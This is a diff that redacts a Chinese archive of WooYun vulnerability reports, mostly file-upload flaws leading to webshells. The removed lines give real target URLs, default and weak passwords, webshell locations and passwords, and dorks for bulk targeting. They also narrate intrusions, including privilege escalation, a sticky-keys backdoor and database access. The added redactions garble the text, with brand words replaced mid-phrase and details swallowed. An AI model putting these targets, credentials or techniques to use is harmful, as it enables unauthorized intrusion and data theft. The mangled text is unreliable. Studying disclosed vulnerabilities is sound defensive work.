-**详情**: http://www2.pccu.edu.tw/CRB/FckEditor/存在fck编辑器，而且版本比较低。iis6.0解析。上传一句话，菜刀又连接不了。难道水土不服？咨询了下别人，给了个奇葩的一句话。可以链接，但提示有错误发生。水平不够，各种换大马，直接传发现有个hacker用户。好像目录权限限制比较死，想把马儿都传不到其他目录。未做提权测试。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14843,7 +14843,7 @@
 
 ---
 ### [wooyun-2013-027655] 成功渗透联通wo开发者社区（来个安卓后门？）
-**厂商**: 中国联通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -14854,13 +14854,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: dev.wo.com.cn，联通的开发者社区，问题还是出自上传。为什么国字头安全这么弱？，社区当然先注册个马甲咯，登入后，我一个劲的找上传点，这种站点也就上传处有问题了。，首先是上传作品处，很多上传点，试了半天，坑爹啊，为了满足像素用了QQ截图，然后插一句话，尼玛最后发现附件插入数据库了，我擦，Q币这么难拿？然后了我的资源处，更坑爹，发现个fckeditor编辑器，一阵狂试，发现该删的都删了，上传资源图片那边，尼玛抓不到包，不知道为什么。最后来到了我的创意处，和我的资源那边差不多，当时想放弃了，可是Q币啊。。然后继续传了下，发现通过抓包该后缀名成功传上去了，，可是打开这个地址的时候慌了，因为咋看就是http 404啊，当时想哭了，，怎么赚点Q币这么难！！我不甘心，就用菜刀连了下，奇迹发生了。。。。这种设计真是奇葩。。耍人哈。。
+**详情**: dev.wo.com.cn，联通的开发者社区，问题还是出自上传。为什么国字头安全这么弱？，社区当然先注册个马甲咯，登入后，我一个劲的找上传点，这种站点也就上传处有问题了。，首先是上传作品处，很多上传点，试了半天，坑爹啊，为了满足像素用了某互联网公司截图，然后插一句话，尼玛最后发现附件插入数据库了，我擦，Q币这么难拿？然后了我的资源处，更坑爹，发现个fckeditor编辑器，一阵狂试，发现该删的都删了，上传资源图片那边，尼玛抓不到包，不知道为什么。最后来到了我的创意处，和我的资源那边差不多，当时想放弃了，可是Q币啊。。然后继续传了下，发现通过抓包该后缀名成功传上去了，，可是打开这个地址的时候慌了，因为咋看就是http 404啊，当时想哭了，，怎么赚点Q币这么难！！我不甘心，就用菜刀连了下，奇迹发生了。。。。这种设计真是奇葩。。耍人哈。。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 百度
+**修复**: 某搜索引擎
 ---
 
 ---
@@ -14878,7 +14878,7 @@
 
 **详情**: 安徽省淮北市旅游局官网任意文件上传漏洞
 
-**POC**: http://www.hbsly.gov.cn/admin/module/3/file.php?filename=CPTP&id=79可上传任意格式文件直接GET webshell
+**POC**: https://example.com/[已脱敏] webshell
 
 **绕过**: 直接利用
 
@@ -14898,7 +14898,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞点：jcms/m_5_7/replace/opr_importinfo.jsp部分系统还存在越权。fn_billstatus为1时可以直接访问该页面无需验证：http://www.shanting.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1http://tuoshan.yzwh.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1
+**详情**: 漏洞点：jcms/m_5_7/replace/opr_importinfo.jsp部分系统还存在越权。fn_billstatus为1时可以直接访问该页面无需验证：https://example.com/[已脱敏]
 
 **POC**: 扯下代码// 基本变量初始化String strFilePath = "";String strFileName = "";strFilePath = application.getRealPath("") + "/m_5_7/replace/temp/";路径就是这了，不多说，下面看关键的（省略了一部分）：CommonUploadFile upload = new CommonUploadFile(strFilePath, "");boolean bResult = upload.uploadFile(request);String strUpFileName = "";if (bResul
 
@@ -14920,7 +14920,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cms.chinabidding.com/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector绝对路径：/data/cms/bidcms/WebRoot/UserFiles/目录无执行权限，怎么办？跨目录传，但是其他目录访问都跳转到登录页了。还好有其他虚拟目录：/jiankong/权限还挺高。。不知有敏感数据否.
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14942,7 +14942,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 任意文件上传漏洞页面http://web.10050.net/Admin/Upload.asp
+**详情**: 任意文件上传漏洞页面https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15008,9 +15008,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址http://www.wengyuan.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可以直接上传jsp大马
+**详情**: 漏洞地址https://example.com/[已脱敏]
 
-**POC**: 大马地址:http://www.wengyuan.gov.cn/UserUpLoadFiles/Image/mews/gsrc.jsp可以直接拿到服务器权限，后面就没做了！
+**POC**: 大马地址:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15032,7 +15032,7 @@
 
 **详情**: 刚才看了看，这货难道属于华为吗？还是说只是合作关系？华思通网络技术有限公司是一家视频会议网络服务公司，是华为的技术合作伙伴，依托华为会议产品及技术实力，提供网络视频会议、 网络市场活动、网络培训等互联网在线服务。不管咋样，漏洞还是照常提交吧
 
-**POC**: 先访问：http://meetinglive.teleuc.com/jsp/main/site/uploadsiteimg.jsp选好文件之后，再点一次浏览前面的对话会，然后点取消，之后回车就可以自动提交了，连exp都省了写从上图也可以看出实际上是imgsave这一个action出了问题，对应的class是com.teleuc.controller.SiteSettingControllers，一看就有漏洞嘛……public String imgsave(){String str = UUID.randomUUID() + StringUtils.getExtention(this.filel
+**POC**: 先访问：https://example.com/[已脱敏] String imgsave(){String str = UUID.randomUUID() + StringUtils.getExtention(this.filel
 
 **绕过**: 直接利用
 
@@ -15052,9 +15052,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: **.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414353934005452034.jsp     k8**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414322354364248413.jsp      k8**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414304748258242144.jsp    k8**.**.**.**/defaultrootht
+**详情**: **.**.**.**/defaultroothttps://example.com/[已脱敏]     k8**.**.**.**/defaultroothttps://example.com/[已脱敏]      k8**.**.**.**/defaultroothttps://example.com/[已脱敏]    k8**.**.**.**/defaultrootht
 
-**POC**: 以东风汽车股份有限公司为例：**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080403531780230087662.jsp密码为tom使用k8飞刀连接。可能有些链接已经失效了，按照wooyun-2014-064324提供的方法复现即可。谢谢作者提供的方法。
+**POC**: 以东风汽车股份有限公司为例：**.**.**.**/defaultroothttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15074,9 +15074,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.sdufe.edu.cn/set_book.php?online=1test test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://vpn.sdufe.edu.cn/por/service.csp?rnd=lmgjiilfibhgggbd19877169 wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名
+**详情**: https://example.com/[已脱敏] test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://example.com/[已脱敏] wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名
 
-**POC**: http://oa.sdufe.edu.cn/set_book.php?online=1test test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://vpn.sdufe.edu.cn/por/service.csp?rnd=lmgjiilfibhgggbd19877169 wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名
+**POC**: https://example.com/[已脱敏] test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://example.com/[已脱敏] wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名
 
 **绕过**: 直接利用
 
@@ -15096,9 +15096,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://mail.gjqh.com.cn:9090/webcall/messageNoteAdd.jsp问题出在附件上传处，未对上传的文件进行过滤，虽然系统在访问jsp、jspx等木马文件时会跳转到登录页，但可以绕过因为系统的任务类型处没有值，但其又是必填项，所以只能本地构造数据包进行上传POST http://im.gjzq.cn:9090/webcall/messageNoteAdd.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://im.gjzq.cn:9090/webcall/messageNoteAdd.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6
+**详情**: 漏洞地址：https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏] zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6
 
-**POC**: 上传后文件存在在根目录下的upload文件夹http://mail.gjqh.com.cn:9090https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.JSPX我们利用linux系统的一些特性，后缀使用大写字母再次上传一句话http://mail.gjqh.com.cn:9090https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.JSPX密码：023
+**POC**: 上传后文件存在在根目录下的upload文件夹https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -15107,7 +15107,7 @@
 
 ---
 ### [wooyun-2013-047090] 泉州移动在线营业厅任意文件上传漏洞
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -15118,7 +15118,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 链接：http://www.qz10085.com/zxb.html 可任意上传
+**详情**: 链接：https://example.com/[已脱敏] 可任意上传
 
 **POC**: (见原文)
 
@@ -15140,7 +15140,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题还是配置IIS时1.WEB服务器扩展里设置WebDAV为允许2.网站权限配置里开启了写入权限http://study.dlteacher.com/ 大连市教师学习中心测试步骤依旧和上一个一样，直接利用iis6.0的解析漏洞传一句话提权什么的无压力，3389也开着，不过发现已经被光顾过了，数据库中47681条教师的详细资料可能已被泄露当然网站管理方的安全意识也需提高，这不仅仅体现在iis的配置上，包括就连ftp的连接账号密码居然也用文本存起来，数据库备份文件、网站源码通通与网站根目录同一文件夹中，并且可以任意下载。
+**详情**: 问题还是配置IIS时1.WEB服务器扩展里设置WebDAV为允许2.网站权限配置里开启了写入权限https://example.com/[已脱敏] 大连市教师学习中心测试步骤依旧和上一个一样，直接利用iis6.0的解析漏洞传一句话提权什么的无压力，3389也开着，不过发现已经被光顾过了，数据库中47681条教师的详细资料可能已被泄露当然网站管理方的安全意识也需提高，这不仅仅体现在iis的配置上，包括就连ftp的连接账号密码居然也用文本存起来，数据库备份文件、网站源码通通与网站根目录同一文件夹中，并且可以任意下载。
 
 **POC**: 如上
 
@@ -15184,7 +15184,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://tgonline.moe.gov.sg/tgis/secure/loginStudent.action
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15250,9 +15250,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://221.228.204.53:8080/（别问我为什么这个是金山的，看看54和46）先是简单的一个列目录然后翻了翻找到一个霸气系统http://221.228.204.53:8080/N-grammar/web/ui/可以上传文件其中有一处查看自己的任务，可以下载任意文件我上传了几个php文件，不是md5猜解，没有结果，所以现在看不到下载按钮了，就在结果列：关键代码：function download_file(){if(!empty($_REQUEST['download_file'])){$downfilename = $_REQUEST['download_file'];$tfile = $_SERVER['DOCUMENT_ROOT']."/N-grammar/web/data/result/".$downfilename;if (file_exists($tfile
+**详情**: http://[IP已脱敏] download_file(){if(!empty($_REQUEST['download_file'])){$downfilename = $_REQUEST['download_file'];$tfile = $_SERVER['DOCUMENT_ROOT']."/N-grammar/web/data/result/".$downfilename;if (file_exists($tfile
 
-**POC**: http://221.228.204.53:8080/N-grammar/webhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/task/test4.php
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -15272,7 +15272,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点未做升级补丁，造成漏洞产生、。http://www.post.com.cn/路径自己找下。
+**详情**: 站点未做升级补丁，造成漏洞产生、。https://example.com/[已脱敏]
 
 **POC**: 站点未做升级补丁，造成漏洞产生、。路径自己找下。
 
@@ -15316,7 +15316,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: S2漏洞执行..http://218.6.145.99:8088//cmis/common/usersAction_login.action
+**详情**: S2漏洞执行..http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -15448,7 +15448,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这里可以遍历目录http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/任意上传马http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.jsp?type=bszn上一句话成功3389一改 netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器
+**详情**: 这里可以遍历目录http://[IP已脱敏] netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器
 
 **POC**: 进入服务器
 
@@ -15472,7 +15472,7 @@
 
 **详情**: 你懂的。
 
-**POC**: http://z.duowan.com/ucenter/data/tmp/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15492,9 +15492,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html
+**详情**: 此处存在任意上传https://example.com/[已脱敏]
 
-**POC**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html
+**POC**: 此处存在任意上传https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15514,7 +15514,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传未做任何过滤上传点：http://www.whcits.com/xieyou.aspx
+**详情**: 上传未做任何过滤上传点：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15536,7 +15536,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海人，对这个瞄了很久http://www.shyule.org/看了一下旁站，仔细寻找，终于............http://www.bio-tag.com.cn/ftb.imagegallery.aspx可以直接上传一句话没有任何防护，直接提权我没有添加用户，而是替换了shift为任务管理器后门211.152.45.195:12367shift5下调出后门进入里面有不少重要的网站，和部分数据库例举其中几个网站吧乱七八糟的都有当是我的目标是数据库打开web.config发现是智库分离ip指向116.228.40.12是上海市电信的直接打开发现试试8080端口好吧到处结束吧实在没法深入了也懒得深入了求10rank买个T恤跪谢
+**详情**: 上海人，对这个瞄了很久https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15558,7 +15558,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.141.228.206/admin admin 直接登录
+**详情**: http://[IP已脱敏] admin 直接登录
 
 **POC**: (见原文)
 
@@ -15602,7 +15602,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://portal.qiyi.domain220.181.184.53	portal.qiyi.domainhttps://220.181.184.53/.svn/entries8dir2300https://scm.qiyi.domain:18080/svn/portal_operation/trunk/res/publichttps://scm.qiyi.domain:18080/svn/portal_operation2013-03-26T07:50:56.166894Z2269luweijunsvn:special svn:externals svn:needs-lock3eeddd20-9c49-467e-b59e-0c7553dc7369tmpdirlaraveldirstaticdircssdirnagios_apidir.htaccess网站根目录/srv/www
+**详情**: https://example.com/[已脱敏]	portal.qiyi.domainhttps://[IP已脱敏] svn:externals svn:needs-lock3eeddd20-9c49-467e-b59e-0c7553dc7369tmpdirlaraveldirstaticdircssdirnagios_apidir.htaccess网站根目录/srv/www
 
 **POC**: 还可撞库，暴力猜解用户密码
 
@@ -15612,8 +15612,8 @@
 ---
 
 ---
-### [wooyun-2012-011779] 百度Ueditor开源编辑器Java版本jsp文件上传漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-011779] 某搜索引擎Ueditor开源编辑器Java版本jsp文件上传漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -15646,7 +15646,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://sisunet.shisu.edu.cn/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp  默认上传地址
+**详情**: https://example.com/[已脱敏]  默认上传地址
 
 **POC**: 可直接上传 结合IIS6.0解析   一句话提示文件过小  果断来一发大马直接上传成功  查看源码  得到shell地址权限很大 组建支持可提服务器
 
@@ -15690,9 +15690,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 技术支持：新禾科技版权所有:河北新禾科技(集团)有限公司 电话:0311-85265566百度dork： inurl:cyportal （案例可参照之前的漏洞）WooYun: 某建站系统通用型文件上传导致任意代码执行继续看了看，发现存在任意文件下载漏洞（包括系统&应用系统本身）反编译 DownloadServlet.class 文件，看到可直接通过参数 filePath 及 templateName 来下载目标文件String filePath = RequestUtil.convertParameter(request.getParameter("filePath"), "iso-8859-1", "gbk");String templateName = RequestUtil.convertParameter(request.getParameter("templateName"), 
+**详情**: 技术支持：新禾科技版权所有:河北新禾科技(集团)有限公司 电话:0311-85265566某搜索引擎dork： inurl:cyportal （案例可参照之前的漏洞）WooYun: 某建站系统通用型文件上传导致任意代码执行继续看了看，发现存在任意文件下载漏洞（包括系统&应用系统本身）反编译 DownloadServlet.class 文件，看到可直接通过参数 filePath 及 templateName 来下载目标文件String filePath = RequestUtil.convertParameter(request.getParameter("filePath"), "iso-8859-1", "gbk");String templateName = RequestUtil.convertParameter(request.getParameter("templateName"), 
 
-**POC**: 这里给出几个漏洞利用案例：#1 http://www.hebkjxx.cn/ 河北省会计信息网①获取 filePathhttp://www.hebkjxx.cn/cyportal1.3/DownloadTemplateFile?operate=all②下载 web.xmlhttp://www.hebkjxx.cn/cyportal1.3/DownloadServlet?filePath=D:/bea/user_projects/domains/hebkjxx_domain/autodeploy/cyportal1.3/WEB-INF/&templateName=web.xml#2 http:/
+**POC**: 这里给出几个漏洞利用案例：#1 https://example.com/[已脱敏] 河北省会计信息网①获取 filePathhttps://example.com/[已脱敏] web.xmlhttps://example.com/[已脱敏] http:/
 
 **绕过**: 直接利用
 
@@ -15712,9 +15712,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题案例举例：http://oa.syc.com.cn/OA/index/index.aspxhttp://xinhuachongming.com.cn/DSOA_TY/index/index.aspxhttp://221.199.203.230:9001/dsoa/index/index.aspxhttp://180.166.56.106/dsoa/index/index0.aspxhttp://sd.tobacco.com.cn/dsoa_kgj_web/index/index0.aspx1.后台信息泄露，访问后台虽然提示未登录，但是还是能显示部分内容，比如：http://oa.syc.com.cn/oa/useradmin/index.aspx2.oa使用2.6.3版本的fckeditor编辑器，可以上传任意文件，只不过需要点奇葩的文件名：http://oa.syc.com.cn/o
+**详情**: 问题案例举例：https://example.com/[已脱敏]
 
-**POC**: 用官网做证明：1.后台信息泄露，访问后台虽然提示未登录，但是还是能显示部分内容，很多目录都这样，访问：http://oa.syc.com.cn/oa/useradmin/index.aspx2.oa使用2.6.3版本的fckeditor编辑器，可以上传任意文件，只不过需要点奇葩的文件名：http://oa.syc.com.cn/oa/FCKeditor/editor/filemanager/connectors/asp/connector.asp本地构造上传页面：这里按理说可以用asp的那个%00 url-decode截断上传的，但是各种传不上，变成随机文件名，这里就可以使用传说中的那个奇葩文
+**POC**: 用官网做证明：1.后台信息泄露，访问后台虽然提示未登录，但是还是能显示部分内容，很多目录都这样，访问：https://example.com/[已脱敏] url-decode截断上传的，但是各种传不上，变成随机文件名，这里就可以使用传说中的那个奇葩文
 
 **绕过**: 直接利用
 
@@ -15734,7 +15734,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国建设银行投资研究网存在文件上传漏洞，已经成功。具体细节可以通过qq联系我http://ris.ccb.com/CN/feedback/backdoor.jsphttp://ris.ccb.com/CN/feedback/<form action ="http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=File&CurrentFolder=../../../../Jweb_tzyj/CN/feedback/"method="post" name="form1" enctype="multipart/form-data"><input name="NewFile" type=
+**详情**: 中国建设银行投资研究网存在文件上传漏洞，已经成功。具体细节可以通过某互联网公司联系我https://example.com/[已脱敏] action ="https://example.com/[已脱敏]"method="post" name="form1" enctype="multipart/form-data"><input name="NewFile" type=
 
 **POC**: 成功上传了
 
@@ -15778,7 +15778,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.hljlsj.gov.cn/fileup.aspx此处随意上传。上传后的马可以在image目录找到，没有重命名。马传上去之后当然第一件事就是先看看web.config你会发现sa竟然是空口令但是不知道天朝的大神是咋搞的，连接的时候地址只能写自己的外网IP地址，写localhost都连不上。连上数据库之后发现啥各种个人信息和电话号码啥的，上边还有个OA系统。= =，当然我啥也没干，也不知道前几天烧了多少吨粮食。好吧，既然有sa了下面也就没啥说的了。不过我还是想吐槽一下，虽然前几天粮库失火损失惨重，但其实给服务器加两根内存条还是花不了多少钱的，多多少少也提升一下服务器的性能，不然技术人员远程连接到服务器操作的时候实在是太费劲了。
+**详情**: https://example.com/[已脱敏] =，当然我啥也没干，也不知道前几天烧了多少吨粮食。好吧，既然有sa了下面也就没啥说的了。不过我还是想吐槽一下，虽然前几天粮库失火损失惨重，但其实给服务器加两根内存条还是花不了多少钱的，多多少少也提升一下服务器的性能，不然技术人员远程连接到服务器操作的时候实在是太费劲了。
 
 **POC**: (见原文)
 
@@ -15822,7 +15822,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关键字:inurl:/ws2004/inurl:/vc2003/login/社区系统地址:/vc2003/login/main.asp这是一个集成安装的程序，所以社区系统自带，谷歌和百度收录不是很多，关键词也可以.WooYun: 某通用型校园管理系统任意文件上传继上次提交过的任意文件上传，用户登录页面还存在GET注入。漏洞地址：vc2003/login/main.asp（登录抓包）vc2003/login/login.asp?UN=admin&PW=admin&ST=RegUN参数过来不严格直接带入查询
+**详情**: 关键字:inurl:/ws2004/inurl:/vc2003/login/社区系统地址:/vc2003/login/main.asp这是一个集成安装的程序，所以社区系统自带，谷歌和某搜索引擎收录不是很多，关键词也可以.WooYun: 某通用型校园管理系统任意文件上传继上次提交过的任意文件上传，用户登录页面还存在GET注入。漏洞地址：vc2003/login/main.asp（登录抓包）vc2003/login/login.asp?UN=admin&PW=admin&ST=RegUN参数过来不严格直接带入查询
 
 **POC**: 登录抓包：GET /vc2003/login/login.asp?UN=admin&PW=admin&ST=Reg HTTP/1.1Host: www.tlzz.comProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safar
 
@@ -15832,8 +15832,8 @@
 ---
 
 ---
-### [wooyun-2016-0170555] 中国联通某省接入网综合网管系统弱口令影响多个城市、有城市影响到业务系统
-**厂商**: 中国联通 | **年份**: 2016 | **类型**: 基础设施弱口令
+### [wooyun-2016-0170555] 某运营商某省接入网综合网管系统弱口令影响多个城市、有城市影响到业务系统
+**厂商**: 某运营商 | **年份**: 2016 | **类型**: 基础设施弱口令
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -15866,7 +15866,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 温州市行政服务网http://www.wzae.gov.cn/was/portals/index.jsp 选择注册用户  有个上传的地方 没有任何过去  可以直接上传JSP大马
+**详情**: 温州市行政服务网https://example.com/[已脱敏] 选择注册用户  有个上传的地方 没有任何过去  可以直接上传JSP大马
 
 **POC**: (见原文)
 
@@ -15888,13 +15888,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.http://www.3g.cn/admin/default.aspx  弱口令 test test //这个网站经过测试了2.看到了编辑器，果断查看源代码发现是Freetextbox，百度下漏洞 发现其可上传asp;jpg3.上传成功...4.后门已删除4.谢绝跨省，不谢绝礼物
+**详情**: 1.https://example.com/[已脱敏]  弱口令 test test //这个网站经过测试了2.看到了编辑器，果断查看源代码发现是Freetextbox，某搜索引擎下漏洞 发现其可上传asp;jpg3.上传成功...4.后门已删除4.谢绝跨省，不谢绝礼物
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复方法 修复编辑器百度一下就有test用户可以改名改密码了....谢绝跨省不谢绝礼物....
+**修复**: 修复方法 修复编辑器某搜索引擎一下就有test用户可以改名改密码了....谢绝跨省不谢绝礼物....
 ---
 
 ---
@@ -15910,9 +15910,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 查点东西,刚好碰上了,作为良好公民,应该有向党和国家反应问题的觉悟.中华人民共和国交通运输部网站使用TRS WCM V6.5搭建，网站存在文件写入漏洞还未修复，WCM后台地址：http://wcm.moc.gov.cn:9000/wcm/，漏洞详情参见:WooYun: TRS WCM 6.X系统任意文件写入漏洞
+**详情**: 查点东西,刚好碰上了,作为良好公民,应该有向党和国家反应问题的觉悟.中华人民共和国交通运输部网站使用TRS WCM V6.5搭建，网站存在文件写入漏洞还未修复，WCM后台地址：https://example.com/[已脱敏] TRS WCM 6.X系统任意文件写入漏洞
 
-**POC**: http://wcm.moc.gov.cn:9000/wcm/demo/loginpage.jsp我应该写国庆节快乐的~
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15934,11 +15934,11 @@
 
 **详情**: 
 
-**POC**: <img src="http://app.zplay.cn/client/1116154235ck.txt" alt="" />http://app.zplay.cn/client/1116154235ck.txt
+**POC**: <img src="https://example.com/[已脱敏]" alt="" />https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 表示限制下上传的后拽。联系本人qq1097131147
+**修复**: 表示限制下上传的后拽。联系本人某互联网公司1097131147
 ---
 
 ---
@@ -15954,9 +15954,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://paipai.jstv.com先注册一个用户 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。下面三个连接为测试 请自行删除。谢谢http://paipai.jstv.com/Video/Detail/13430http://paipai.jstv.com/Video/Detail/13431http://paipai.jstv.com/Video/Detail/13433
+**详情**: https://example.com/[已脱敏] 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。下面三个连接为测试 请自行删除。谢谢https://example.com/[已脱敏]
 
-**POC**: http://paipai.jstv.com先注册一个用户 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。测试上传的连接和目录下面的webshell 请自行删除。谢谢http://paipai.jstv.com/Video/Detail/13430http://paipai.jstv.com/Video/Detail/13431http://paipai.jstv.com/Video/Detail/13433
+**POC**: https://example.com/[已脱敏] 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。测试上传的连接和目录下面的webshell 请自行删除。谢谢https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15976,7 +15976,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1.某政府专用CMS由于附带Ewebeditor编辑器，并且因为配置错误行为，编辑器没有过滤恶意的后缀文件，导致用户可以上传JSP脚本木马，大量政府网遭殃！通过百度、谷歌、搜狗可批量查询到这样的网站，数量巨多！如下：Google or Baiduinurl:/main/model/newinfoinurl:newinfo.do?infoId百度为您找到相关结果约1,000,000个谷歌找到约 136,000 条结果 （用时 0.45 秒）#2.EwebEditor编辑器的位置处于：http://www.***.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jspPS：如果编辑器出错或其它之类，完全可以本地构造上传表达进行上传，这个你懂得！
+**详情**: #1.某政府专用CMS由于附带Ewebeditor编辑器，并且因为配置错误行为，编辑器没有过滤恶意的后缀文件，导致用户可以上传JSP脚本木马，大量政府网遭殃！通过某搜索引擎、谷歌、搜狗可批量查询到这样的网站，数量巨多！如下：Google or Baiduinurl:/main/model/newinfoinurl:newinfo.do?infoId某搜索引擎为您找到相关结果约1,000,000个谷歌找到约 136,000 条结果 （用时 0.45 秒）#2.EwebEditor编辑器的位置处于：http://www.***.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jspPS：如果编辑器出错或其它之类，完全可以本地构造上传表达进行上传，这个你懂得！
 
